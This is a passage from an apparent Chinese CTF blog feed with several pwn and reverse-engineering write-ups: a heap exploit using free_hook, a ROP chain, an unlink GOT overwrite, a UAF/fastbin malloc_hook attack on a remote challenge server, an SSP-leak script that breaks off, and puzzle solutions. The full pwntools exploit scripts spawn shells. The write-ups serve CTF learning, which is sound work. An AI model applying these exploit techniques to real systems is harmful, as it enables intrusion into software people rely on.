class="line">之后就可以`edit_singledog`把luckydog中的buf改为two[0]，这样再次`edit_luckydog`时，就能修改two[0]为bss段的`stderr`地址，之后再次`edit_singledog`，就能leak出`stderr`地址。</span><br></pre></td></tr></table></figure></p><p>edit_single((0x2e0-0x60)/8,p64(proc_base+elf.sym[‘two’]))<br>edit_lucky(0,”<em>**</em>“,p64(proc_base+elf.sym[‘stderr’]))<br>edit_single(0,”\x80”)<br>io.recvuntil(“new name: “)<br>libc_base = (u64(io.recv(6).ljust(8,’\x00’)))-libc.sym[‘_IO_2_1_stderr_’]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">关于libc的版本，出题人说可以尝试摸索发现程序存在tcache机制，随后判断libc版本为2.26或2.27，不过我现在对tcache还不是很了解……</span><br><span class="line"></span><br><span class="line">之后再次类似地将luckydog中的buf改为freehook的地址，修改freehook为system函数，再想办法让free时参数为/bin/sh即可。</span><br><span class="line"></span><br><span class="line">exp(照抄人人人师傅)：</span><br></pre></td></tr></table></figure></p><p>from pwn import *<br>elf     = ELF(“./apwn.dms”)<br>libc     = ELF(“/lib/x86_64-linux-gnu/libc-2.27.so”)<br>io = process(“./apwn.dms”,env={“LD_PRELOAD”:”/lib/x86_64-linux-gnu/libc-2.27.so”})<br>def choice(c):<br>    io.sendlineafter(“&gt;&gt;\n”,str(c))<br>def single(name):<br>    choice(1)<br>    io.sendafter(“Name:\n”,name)<br>def lucky(name,cp_name):<br>    choice(2)<br>    io.sendafter(“Name\n”,name)<br>    io.sendafter(“your partner’s name\n”,cp_name)<br>def edit_single(idx,new_name):<br>    choice(3)<br>    io.sendlineafter(“which?”,str(idx))<br>    io.sendafter(“Oh,singledog,changing your name can bring you good luck.\n”,new_name)<br>def edit_lucky(idx,new_name,new_cp_name):<br>    choice(4)<br>    io.sendlineafter(“which?”,str(idx))<br>    io.sendafter(“Oh,luckydog,What is your new name?\n”,new_name)<br>    io.sendafter(“your partner’s new name\n”,new_cp_name)<br>def save_single():<br>    choice(5)</p><p>lucky(“0000”,”0001”)<br>single(“0000”)</p><p>edit_single((0x2e0-0x60)/8,”\x00”)<br>io.recvuntil(“new name: “)<br>heap_base = (u64(io.recv(6).ljust(8,’\x00’))&amp;0xfffffffff000)<br>success(“HEAP BASE -&gt; %#x”%heap_base)</p><p>edit_single((0x08-0x60)/8,”\x08”)<br>io.recvuntil(“new name: “)<br>proc_base = (u64(io.recv(6).ljust(8,’\x00’))-0x202008)<br>success(“PROC BASE -&gt; %#x”%proc_base)</p><p>edit_single((0x2e0-0x60)/8,p64(proc_base+elf.sym[‘two’]))<br>edit_lucky(0,”<em>**</em>“,p64(proc_base+elf.sym[‘stderr’]))<br>edit_single(0,”\x80”)<br>io.recvuntil(“new name: “)<br>libc_base = (u64(io.recv(6).ljust(8,’\x00’)))-libc.sym[‘_IO_2_1_stderr_’]<br>success(“LIBC BASE -&gt; %#x”%libc_base)</p><p>edit_lucky(0,”echo X;/bin/sh\x00”,p64(libc_base+libc.sym[‘__free_hook’]))<br>edit_single(0,p64(libc_base+libc.sym[‘system’]))<br>lucky(“/bin/sh\x00”,”/bin/sh\x00”)<br>save_single()<br>io.interactive()<br><code>`</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>某stack-4</title>
      <link href="/2019/03/19/%E6%9F%90stack-4/"/>
      <url>/2019/03/19/%E6%9F%90stack-4/</url>
      
        <content type="html"><![CDATA[<p>一道静态编译的栈题，利用ROPgadget构造ropchain。</p><a id="more"></a><p>只开了NX保护。</p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g18hv55srjj30ic0mygoh.jpg" alt></p><p>可以发现如果v6的值也就是计算次数足够大的时候，使用功能5就可以产生栈溢出，但是要注意的是这里ida显示的v5的地址是ebp-0x34，但事实上调试来看，这个地址是错误的。</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g18hxfrdryj30zm0isteo.jpg" alt></p><p>这里可以看见ebp的地址是<code>FF80A888</code>，我调试时输入的计算结果3次都是<code>0xA0</code>，可以知道v5的地址是<code>FF80A84C</code>，是ebp-0x3c,所以覆盖到返回地址所需要的偏移为0x3c+4，覆盖所需要的计算次数是16次。</p><p>为了获取shell，使用了ROPgadget生成rop链。</p><p><code>ROPgadget --binary stack-4. ropchain</code></p><p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g18i62f59jj30ro0uwwn8.jpg" alt></p><p>因为这个程序构造ropchain只能四个字节四个字节地构造，所以把ropgadget提供的ropchain拆解一下，自己手动构造，需要注意的是’/bin’和’//sh’转换成数字时需要注意大小端序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;nib/&apos;=0x6e69622f</span><br><span class="line">&apos;hs//&apos;=0x68732f2f</span><br><span class="line">p=[0x0806ed0a,0x080ea060,0x080bb406,0x6e69622f,0x080a1dad,0x0806ed0a,0x080ea064,0x080bb406,0x68732f2f,0x080a1dad,0x0806ed0a,0x080ea068,0x08054730,0x080a1dad,0x080481c9,0x080ea060,0x0806ed31,0x080ea068,0x080ea060,0x0806ed0a,0x080ea068,0x08054730,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x08049781]</span><br></pre></td></tr></table></figure><p>另外由于完成构造后还需要进行计算一次才能完成覆盖，所以计算次数为<code>16+len(p)+1</code>。</p><p>最终脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=process(&apos;./stack-4.&apos;)</span><br><span class="line">elf=ELF(&apos;./stack-4.&apos;)</span><br><span class="line">p=[0x0806ed0a,0x080ea060,0x080bb406,0x6e69622f,0x080a1dad,0x0806ed0a,0x080ea064,0x080bb406,0x68732f2f,0x080a1dad,0x0806ed0a,0x080ea068,0x08054730,0x080a1dad,0x080481c9,0x080ea060,0x0806ed31,0x080ea068,0x080ea060,0x0806ed0a,0x080ea068,0x08054730,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x08049781]</span><br><span class="line">sh.recvuntil(&quot;calculate:&quot;)</span><br><span class="line">sh.sendline(str(16+len(p)+1))</span><br><span class="line">for i in range(16):</span><br><span class="line">sh.recvuntil(&quot;result\n&quot;)</span><br><span class="line">sh.sendline(&quot;1&quot;)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(&quot;0&quot;)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">for i in range(len(p)):</span><br><span class="line">sh.recvuntil(&quot;result\n&quot;)</span><br><span class="line">sh.sendline(&quot;1&quot;)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(&quot;0&quot;)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(p[i]))</span><br><span class="line">sh.recvuntil(&apos;result\n&apos;)</span><br><span class="line">sh.sendline(&apos;5&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2014 HITCON stkof</title>
      <link href="/2019/03/19/2014-HITCON-stkof/"/>
      <url>/2019/03/19/2014-HITCON-stkof/</url>
      
        <content type="html"><![CDATA[<p>一道简单的unlink题，CTFWIKI上解释的很清楚。</p><a id="more"></a><p>运行程序发现没有任何提示性文字，只能直接ida分析了。</p><p>输入<code>1</code>，malloc一个自己指定大小但有限制的空间，并把这个空间的首地址存在bss段的0x602140上的s数组里。</p><p>输入<code>2</code>，可以编辑*s[i]，并且此处有溢出。</p><p>输入<code>3</code>，可以free掉s[i]，free后指针置零，不存在UAF。</p><p>输入<code>4</code>，调用一个没什么用的函数，输出<code>\\TODO</code>或<code>...</code>。</p><p>由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。为了防止对之后的操作产生影响，可以先输入<code>1</code>执行一次，把缓冲区先申请完毕再进行操作。</p><p>首先分配三个chunk：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x100)  完成申请缓冲区add(0x30)   修改这个chunk来覆盖下一个chunkadd(0x80)  free这个chunk完成unlink</span><br></pre></td></tr></table></figure><p>进行unlik：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(0)+p64(0x30)+p64(s+16-0x18)+p64(s+16-0x10)+p64(0)+p64(0)+p64(0x30)+p64(0x90)</span><br><span class="line">edit(2,len(payload),payload)delete(3)</span><br></pre></td></tr></table></figure><p>edit完之后修改的chunk为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000000000000x00000000000000300x00000000006021380x00000000006021400x00000000000000000x00000000000000000x00000000000000300x0000000000000090</span><br></pre></td></tr></table></figure><p>此时free下一个chunk，就会向前与刚刚修改的chunk合并。</p><p>同时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(fakeFD + 0x18) = fakeBK</span><br><span class="line">*(fakeBK + 0x10) = fakeFD</span><br></pre></td></tr></table></figure><p>最终效果就是<code>*(0x602150)==0x602138</code></p><p>此时<code>s[2]=&amp;s[0]</code>,edit(2)就可以对s[0]进行更改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos; * 8 + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;puts&apos;]) + p64(elf.got[&apos;atoi&apos;])edit(2, len(payload), payload)</span><br></pre></td></tr></table></figure><p>再edit(1)就可以修改free的got表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(elf.plt[&apos;puts&apos;])edit(0, len(payload), payload)</span><br></pre></td></tr></table></figure><p>现在调用free时实际调用的就是puts。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh.sendline(&apos;3&apos;)sh.sendline(&apos;1&apos;)puts_add=u64(sh.recv()[:6]+&apos;\x00\x00&apos;)libc_base=puts_add-0x06f690</span><br></pre></td></tr></table></figure><p>这样就可以leak出libc基址（由于没有给libc文件，我事先leak了两个函数地址自己找了libc版本。）</p><p>根据偏移得到system函数地址，并修改atoi的got表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system=libc_base+0x045390edit(2,8,p64(system))</span><br></pre></td></tr></table></figure><p>现在调用atoi时实际调用的就是system。</p><p>程序在选择功能时就会调用atoi，并且参数可以任意输入，输入<code>/bin/sh\x00</code>就可以获取shell。</p><p>最终脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *sh=process(&apos;heap-1.&apos;)elf=ELF(&apos;heap-1.&apos;)def add(size):    sh.sendline(&apos;1&apos;)    sh.sendline(str(size))    sh.recvuntil(&apos;OK\n&apos;)def edit(index, size, content):    sh.sendline(&apos;2&apos;)    sh.sendline(str(index))    sh.sendline(str(size))    sh.send(content)    sh.recvuntil(&apos;OK\n&apos;)def delete(index):    sh.sendline(&apos;3&apos;)    sh.sendline(str(index))    sh.recvuntil(&apos;OK\n&apos;)s=0x602140add(0x100)add(0x30)add(0x80)payload=p64(0)+p64(0x30)+p64(s+16-0x18)+p64(s+16-0x10)+p64(0)+p64(0)+p64(0x30)+p64(0x90)edit(2,len(payload),payload)delete(3)payload = &apos;a&apos; * 8 + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;puts&apos;]) + p64(elf.got[&apos;atoi&apos;])edit(2, len(payload), payload)payload = p64(elf.plt[&apos;puts&apos;])edit(0, len(payload), payload)sh.sendline(&apos;3&apos;)sh.sendline(&apos;1&apos;)puts_add=u64(sh.recv()[:6]+&apos;\x00\x00&apos;)libc_base=puts_add-0x06f690system=libc_base+0x045390edit(2,8,p64(system))sh.sendline(&apos;/bin/sh\x00&apos;)sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CONFidence2019-oldschool</title>
      <link href="/2019/03/17/CONFidence2019-oldschool/"/>
      <url>/2019/03/17/CONFidence2019-oldschool/</url>
      
        <content type="html"><![CDATA[<p>一道8086汇编题。</p><a id="more"></a><p>不知道还会开放多久的<a href="https://confidence2019.p4.team/" target="_blank" rel="noopener">比赛地址</a>。</p><p>运行一波程序，结合汇编进行分析，8086汇编不是很会，看了很久才看出程序大概是个什么逻辑。</p><p>程序一开始会让我们输入，输入的字符仅限于十六进制中存在的字符。当输入到达18个时就会终止输入并开始输出，同时题目给了我们一个flag.txt，里面的字符跟输出的是差不多的。所以猜测我们输入正确的flag就会打印出和flag.txt中一样的内容。</p><p>flag.txt的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  4 &#123;4pp   </span><br><span class="line"> p &#123;k4&#123; E  </span><br><span class="line">p 44p&#123; p   </span><br><span class="line"> 4 p       </span><br><span class="line">  S</span><br></pre></td></tr></table></figure><p>又读了很久汇编后，发现输出的字符是以seg000:000~0a1的值为index，对<code>p4{krule_ctf}</code>取值输出的。</p><p>不妨对flag.txt的内容进行替换一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  2 3211   </span><br><span class="line"> 1 3423 E  </span><br><span class="line">1 2213 1   </span><br><span class="line"> 2 1       </span><br><span class="line">  S</span><br></pre></td></tr></table></figure><p>仔细分析一下程序发现其实这是一个一笔画或者说迷宫，S是起点，E是终点。数字代表着要走到这个地方的次数，输入的每两位会控制走四步，并且只能斜着走，不过不会超过边界，例如从第一行的3的位置往右上走，只会往右移一格。</p><p>知道了规则之后就很简单了，手动走了一下得到了正确的输入，但是却不是正确的flag，阅读题目要求发现输入的ascii码转字符之后要满足p4{[0-9a-z]+}，所以开始3个最后一格ascii码值是固定的，中间的ascii码值也有范围要求。</p><p>以q代表向左上，w代表向右上，a代表向左下，s代表向右下，找到了一条满足要求的路径：<code>qqswqwsqsaswwqawwqswwaawaqsqawawwssw</code></p><p>这条路径所需的输入为：<code>70347b61716932667d</code></p><p>转字符串得到：<code>p4{aqi2f}</code></p><p>一开始没有注意题目的要求，很久没能找到正确的flag，并且也不会编程根据这个图寻找flag，只能手动找路径。比赛结束了一会才找到（说不定正确）的flag，属实弟弟行为。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CGCTF-note</title>
      <link href="/2019/03/13/CGCTF-note/"/>
      <url>/2019/03/13/CGCTF-note/</url>
      
        <content type="html"><![CDATA[<p>入门堆题，没入门的我看了很久才弄出来。</p><a id="more"></a><h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><p>一个简单的note程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.add</span><br><span class="line">2.show</span><br><span class="line">3.edit</span><br><span class="line">4.delete</span><br><span class="line">5.exit</span><br><span class="line">choice&gt;&gt;</span><br></pre></td></tr></table></figure><p>通过ida分析发现没有堆溢出，但是delete的时候指针没有置零，存在UAF。</p><p>开启了pie，所以大致思路是泄漏出libc的真实地址然后修改<code>malloc_hook</code>来执行onegadget。</p><h1 id="泄漏libc真实地址"><a href="#泄漏libc真实地址" class="headerlink" title="泄漏libc真实地址"></a>泄漏libc真实地址</h1><p>先分配两个smallchunk，然后delete第一个，其fd和bk指针就会指向<code>main_arena+88</code>，此时因为UAF，使用show功能就可以得到<code>main_arena+88</code>的真实地址。</p><p>通过<code>main_arena+88</code>在libc文件中的偏移，就可以得到libc的真实基址。</p><h1 id="修改malloc-hook"><a href="#修改malloc-hook" class="headerlink" title="修改malloc_hook"></a>修改malloc_hook</h1><p>在调用malloc函数时，程序会对<code>malloc_hook</code>进行检查，如果不为0，就会调用<code>malloc_hook</code>指向的函数，借此调用onegadget。</p><p>fastbin是一个单链表，其fd指针会指向下一个可分配的chunk。利用UAF修改掉最后并进fastbin中的chunk的fd指针，使其指向任意地址，这样之后第二次malloc出的chunk就会出现在任意地址上，从而实现任意地址写。</p><p>但是在malloc之前，程序会对要分配的地址进行检查，如果没有对应size的chunk，就不会在此处分配，所以要对这个地址进行构造，利用gdb查看内存了解如何构造。</p><h1 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh=process(&quot;./note3&quot;)</span><br><span class="line">sh=remote(&quot;45.76.173.177&quot;,6666)</span><br><span class="line">elf=ELF(&quot;./note3&quot;)</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.recvuntil(&quot;choice&gt;&gt;&quot;)</span><br><span class="line">sh.sendline(&quot;1&quot;)</span><br><span class="line">sh.recvuntil(&quot;Size:&quot;)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(&quot;Content:&quot;)</span><br><span class="line">sh.sendline(content)</span><br><span class="line">def show(index):</span><br><span class="line">sh.recvuntil(&quot;choice&gt;&gt;&quot;)</span><br><span class="line">sh.sendline(&quot;2&quot;)</span><br><span class="line">sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">def edit(index,content):</span><br><span class="line">sh.recvuntil(&quot;choice&gt;&gt;&quot;)</span><br><span class="line">sh.sendline(&quot;3&quot;)</span><br><span class="line">sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">sh.sendline(content)</span><br><span class="line">def delete(index):</span><br><span class="line">sh.recvuntil(&quot;choice&gt;&gt;&quot;)</span><br><span class="line">sh.sendline(&quot;4&quot;)</span><br><span class="line">sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">add(136,&apos;aaaaaaaaabcdefgh&apos;)</span><br><span class="line">add(136,&apos;&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">libc_base=u64(sh.recv(6).ljust(8,&apos;\x00&apos;))-0x397b00-88</span><br><span class="line">onegadget=libc_base+0xd694f</span><br><span class="line">malloc_hook=libc_base+0x397b00-0x10</span><br><span class="line">add(96,&apos;\x22&apos;*16)</span><br><span class="line">delete(2)</span><br><span class="line">edit(2,p64(malloc_hook-0x23))</span><br><span class="line">add(96,&apos;&apos;)</span><br><span class="line">add(96,&apos;\x00&apos;*19+p64(onegadget))</span><br><span class="line">sh.recvuntil(&quot;choice&gt;&gt;&quot;)sh.sendline(&quot;1&quot;)sh.recvuntil(&quot;Size:&quot;)sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>本地process会错误退出，但是remote的话就能成功拿到shell，不知道为啥呢orz</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>调用64位代码的32位程序逆向</title>
      <link href="/2019/03/12/32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E8%B0%83%E7%94%A864%E4%BD%8D%E4%BB%A3%E7%A0%81/"/>
      <url>/2019/03/12/32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E8%B0%83%E7%94%A864%E4%BD%8D%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.sohu.com/a/297547003_120045376" target="_blank" rel="noopener">教程</a></p><a id="more"></a><p>关于如何从32位程序中dump出64位函数，我就不赘述了，上面的文章已经说的很详尽了。</p><p>dump出的64位函数（大致意义上重命名了一些函数，可能有错误）：</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0zw8ti4eyj30o00vydk5.jpg" alt></p><p>对{}中内容的check是以方程组的形式，这里使用了z3求解得到答案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">a1=[BitVec(&apos;a1%d&apos;%i,8) for i in range(11)]</span><br><span class="line">solver=Solver()</span><br><span class="line">solver.add(a1[4] ^ a1[2] ^ a1[6] == 119)</span><br><span class="line">solver.add((a1[1] ^ a1[0] ^ a1[3]) == 54)</span><br><span class="line">solver.add(a1[10] + a1[3] == 85)</span><br><span class="line">solver.add(a1[2] + a1[9] == 219)</span><br><span class="line">solver.add(a1[4] + a1[5] == 158)</span><br><span class="line">solver.add(a1[2] + a1[1] + a1[5] == 196)</span><br><span class="line">solver.add(a1[8] + a1[7] + a1[9] == 194)</span><br><span class="line">solver.add(a1[5] + a1[3] + a1[9] == 190)</span><br><span class="line">solver.add(a1[6] + a1[2] + a1[8] == 277)</span><br><span class="line">solver.add(a1[10] + a1[1] + a1[7] == 124)</span><br><span class="line">solver.add(a1[5] == 48)</span><br><span class="line">solver.add(a1[10] == 53)</span><br><span class="line">solver.add(a1[7] ^ a1[6] ^ a1[8] == 96)</span><br><span class="line">if solver.check() == sat:</span><br><span class="line">  m = solver.model()</span><br><span class="line">  s=[]</span><br><span class="line">  for i in range(11):</span><br><span class="line">    s.append(m[a1[i]].as_long())</span><br><span class="line">print &apos;&apos;.join([chr(i) for i in s])</span><br><span class="line">#   1&apos;m n0t 4n5</span><br></pre></td></tr></table></figure><p>因为存在异或操作，所以定义变量时使用了BitVec。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parallels@parallels-vm:~$ &apos;/home/parallels/64-32-1.&apos; input_code: hwbctf&#123;1&apos;m n0t 4n5&#125;you got it</span><br></pre></td></tr></table></figure><p>做完了才发现这道题和最开始的链接里说的是一道题2333</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2018网鼎杯pwn-GUESS</title>
      <link href="/2019/03/04/2018%E7%BD%91%E9%BC%8E%E6%9D%AFpwn-GUESS/"/>
      <url>/2019/03/04/2018%E7%BD%91%E9%BC%8E%E6%9D%AFpwn-GUESS/</url>
      
        <content type="html"><![CDATA[<p>hint: libc基址泄露+flag泄露</p><a id="more"></a><p>开启了canary保护</p><p>IDA观察一波：</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r4u9gwo2j30rw0oitdk.jpg" alt></p><p>发现输入flag的地方有栈溢出，并且运行了一下发现一共可以输入3次，同时因为有fork的操作，所以即使第一次输入触发了canary，之后仍然可以进行第二第三次输入。</p><p>这里利用<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=44069&amp;highlight=pwn" target="_blank" rel="noopener">SSP Leak</a>就可以泄漏libc基址和flag了。</p><p>触发canary后，程序会以<code>%s</code>输出<code>__libc_main_argv[0]</code>，可以通过栈溢出覆盖到这个位置的，从而泄漏出想要泄漏的东西。</p><p>使用gdb对程序进行调试，很方便就能得到该位置：</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0r55df11yj30f801qt8x.jpg" alt></p><p><code>__libc_main_argv[0]=0x7fffffffdde8</code></p><p>在gets函数后下断点，对栈进行观察，找到输入在栈中的位置：</p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0r56yrwzaj31200hswjb.jpg" alt></p><p>这里我输入的是随便打的<code>tyuio</code></p><p><code>input=0x7fffffffdcc0</code></p><p>所以需要的填充为：<code>0x7fffffffdde8-0x7fffffffdcc0=296</code></p><p>不知道libc版本的话，三次栈溢出貌似不太够用，所以我先泄漏了两个libc函数地址，手动找到了libc版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *sh=process(&quot;./GUESS&quot;)elf=ELF(&quot;./GUESS&quot;)puts_got=elf.got[&quot;puts&quot;]</span><br><span class="line">start_got=elf.got[&quot;__libc_start_main&quot;]</span><br><span class="line">sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(puts_got))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)puts_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)</span><br><span class="line">print hex(puts_add)</span><br><span class="line">sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(start_got))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)start_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)</span><br><span class="line">print hex(start_add)</span><br></pre></td></tr></table></figure><p>一开始接受地址的时候，recv了8个字节，结果出了问题，从上面的栈图中也可以发现，64位程序内存的地址貌似最多只有6个字节，因此接受6个字节，再加2个<code>\x00</code>就可以了。</p><p>运行得到两个libc函数的地址：</p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0r5k5sxg6j30vm0t4aff.jpg" alt></p><p>通过<a href="https://libc.blukat.me/?q=__libc_start_main%3A740%2Cputs%3A690&amp;l=libc6_2.23-0ubuntu10_amd64" target="_blank" rel="noopener">网站在线查询</a>可以得到libc版本（其实也可以用LibcSearcher这个库，但最近重装虚拟机还没弄好）：</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r5ooe7bpj31q00u0jxc.jpg" alt></p><p>得到基址：<code>libc_base=puts_add-0x06f690</code></p><p>为了泄漏flag，还要知道栈的地址。</p><p>libc里有*environ指针指向栈地址，所以可以通过这个指针泄漏栈地址。</p><p>在刚刚的网站可以查到_environ与libc基址之间的偏移。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">environ_add=libc_base+0x3c6f38sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(environ_add))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)stack_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)</span><br></pre></td></tr></table></figure><p>得到了栈地址之后，只要知道flag在栈中的偏移，就可以泄漏flag。</p><p>通过gdb查看栈地址：</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r5hhyg66j30ga01w74i.jpg" alt></p><p>计算flag在栈中偏移：</p><p><code>0x7fffffffddf8-0x7fffffffdc90=360</code></p><p>最终exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *sh=process(&quot;./GUESS&quot;)elf=ELF(&quot;./GUESS&quot;)puts_got=elf.got[&quot;puts&quot;]sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(puts_got))sh.recvuntil(&apos;*** stack smashing detected ***: 